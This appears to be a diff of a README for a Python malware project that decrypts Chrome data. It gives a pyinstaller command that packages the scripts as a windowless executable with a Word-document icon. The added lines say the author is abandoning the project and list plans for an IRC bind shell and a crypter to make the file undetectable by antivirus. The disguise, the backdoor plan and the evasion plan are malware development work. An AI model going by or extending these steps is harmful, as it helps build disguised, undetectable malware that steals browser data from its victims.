@@ -21,6 +21,11 @@ Everything Decrypted
 Simple command to make it to .EXE or docx
 
 pyinstaller.exe --onefile -w chrome.py servo.py --noconsole -i docx.ico
+#
+I wont be continuing this project
 
-
+#TODO
+spawn new cmd for irc bind shell
+add Crypter to be FUD
+{}
 
